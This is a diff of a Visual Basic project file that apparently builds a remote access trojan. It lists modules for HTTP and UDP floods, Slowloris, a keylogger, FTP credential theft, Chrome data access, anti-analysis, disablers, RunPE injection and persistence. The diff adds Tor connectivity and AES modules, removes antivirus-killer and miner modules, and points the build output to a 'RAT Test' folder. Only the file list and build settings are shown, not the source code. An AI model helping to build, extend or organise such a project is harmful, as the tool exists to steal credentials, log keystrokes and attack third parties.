@@ -34,7 +34,7 @@
     <DefineDebug>false</DefineDebug>
     <DefineTrace>false</DefineTrace>
     <Optimize>true</Optimize>
-    <OutputPath>..\Bin\</OutputPath>
+    <OutputPath>..\..\..\..\..\..\Desktop\Card in Half\RAT Test\</OutputPath>
     <DocumentationFile>
     </DocumentationFile>
     <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
@@ -77,6 +77,12 @@
     <Reference Include="InjectionLibrary">
       <HintPath>.\InjectionLibrary.dll</HintPath>
     </Reference>
+    <Reference Include="Org.Mentalis">
+      <HintPath>C:\Users\Mate\source\repos\ModuleConnect\ModuleConnect\bin\Debug\Org.Mentalis.dll</HintPath>
+    </Reference>
+    <Reference Include="SocksWebProxy">
+      <HintPath>C:\Users\Mate\source\repos\ModuleConnect\ModuleConnect\bin\Debug\SocksWebProxy.dll</HintPath>
+    </Reference>
     <Reference Include="System" />
     <Reference Include="System.Data" />
     <Reference Include="System.Deployment" />
@@ -108,18 +114,14 @@
     <Compile Include="Floods\PostHTTP.vb" />
     <Compile Include="Floods\Slowloris.vb" />
     <Compile Include="Floods\UDP.vb" />
+    <Compile Include="Hasher\AES.vb" />
+    <Compile Include="Keylogger\FTPSteal.vb" />
     <Compile Include="Keylogger\Hook.vb" />
     <Compile Include="Keylogger\Logger.vb" />
-    <Compile Include="Killers\AdminAV.vb" />
-    <Compile Include="Killers\AV.vb" />
-    <Compile Include="Killers\BK.vb" />
-    <Compile Include="Killers\HardBK.vb" />
     <Compile Include="Main.vb" />
     <Compile Include="Misc\Antis.vb" />
     <Compile Include="Misc\Chrome.vb" />
     <Compile Include="Misc\Disablers.vb" />
-    <Compile Include="Misc\GPUMiner.vb" />
-    <Compile Include="Misc\Miner.vb" />
     <Compile Include="Misc\RunPE.vb" />
     <Compile Include="Misc\SQLite.vb" />
     <Compile Include="Misc\TorrentSeed.vb" />
@@ -139,9 +141,13 @@
       <DesignTimeSharedInput>True</DesignTimeSharedInput>
     </Compile>
     <Compile Include="Persistence\ProcAccessRights.vb" />
-    <Compile Include="Persistence\Injection.vb" />
     <Compile Include="Persistence\SetProcCritical.vb" />
     <Compile Include="Persistence\Startup.vb" />
+    <Compile Include="References\ComputerComponent.vb" />
+    <Compile Include="References\UserComponent.vb" />
+    <Compile Include="Tor\Connect.vb" />
+    <Compile Include="Tor\Create.vb" />
+    <Compile Include="Tor\Install.vb" />
   </ItemGroup>
   <ItemGroup>
     <EmbeddedResource Include="My Project\Resources.resx">
@@ -167,6 +173,7 @@
   <ItemGroup>
     <None Include="Resources\A.TXT" />
   </ItemGroup>
+  <ItemGroup />
   <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
   <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
        Other similar extension points exist, see Microsoft.Common.targets.
